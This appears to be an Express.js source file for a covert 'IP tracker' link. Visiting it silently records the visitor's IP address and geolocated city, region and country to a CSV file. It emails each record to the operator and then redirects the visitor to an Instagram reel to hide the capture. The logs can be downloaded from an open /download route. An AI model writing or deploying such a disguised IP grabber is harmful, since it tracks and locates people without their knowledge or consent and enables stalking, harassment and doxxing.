const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
require('dotenv').config(); // Make sure you have a .env file with your credentials

const app = express();
const port = process.env.PORT || 3000;

// Trust proxy headers
app.set('trust proxy', true);

// CSV file path
const csvFilePath = path.join(__dirname, 'visitors.csv');

// Add header to CSV if file doesn't exist
if (!fs.existsSync(csvFilePath)) {
  fs.writeFileSync(csvFilePath, 'IP,City,Region,Country,Time\n', 'utf8');
}

// Email transporter setup
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.MAIL_USER,     // Your Gmail
    pass: process.env.MAIL_PASS      // App password (NOT your Gmail password)
  }
});

// Email sending function
function sendEmail(ip, city, region, country, time) {
  const mailOptions = {
    from: process.env.MAIL_USER,
    to: process.env.MAIL_USER_2, // Or any email to receive logs
    subject: '📬 New IP Logged',
    text: `New visitor on black hosre ip tracker by divy jetani and jeel chanchpara, working hard for mini pandu and BMW M5🤩🐼:

IP: ${ip}
City: ${city}
Region: ${region}
Country: ${country}
Time: ${time}
    `
  };

  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error('❌ Email send failed:', err.message);
    } else {
      console.log('📧 Email sent:', info.response);
    }
  });
}

app.get('/', async (req, res) => {
  const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress;
  const ip = rawIp?.replace('::ffff:', '');

  try {
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    const { city, regionName: region, country } = geoRes.data;
    const time = new Date().toISOString();

    console.log(`User IP: ${ip}`);
    console.log(`Location: ${city}, ${region}, ${country}`);

    // Append to CSV file
    const row = `${ip},${city || 'N/A'},${region || 'N/A'},${country || 'N/A'},${time}\n`;
    fs.appendFile(csvFilePath, row, (err) => {
      if (err) console.error('Error saving to CSV:', err.message);
    });

    // Send email
    sendEmail(ip, city || 'N/A', region || 'N/A', country || 'N/A', time);

    // Redirect
    res.redirect('https://www.instagram.com/reel/DJwTkoyooeK/?igsh=MTU0ZmUwNDRobHBpcw==');
  } catch (err) {
    console.error('Geo lookup failed:', err.message);
    res.redirect('https://www.instagram.com/reel/DJwTkoyooeK/?igsh=MTU0ZmUwNDRobHBpcw==');
  }
});

// Download route
app.get('/download', (req, res) => {
  res.download(csvFilePath, 'visitor_logs.csv');
});

app.listen(port, () => {
  console.log(`✅ Server running on port ${port}`);
});
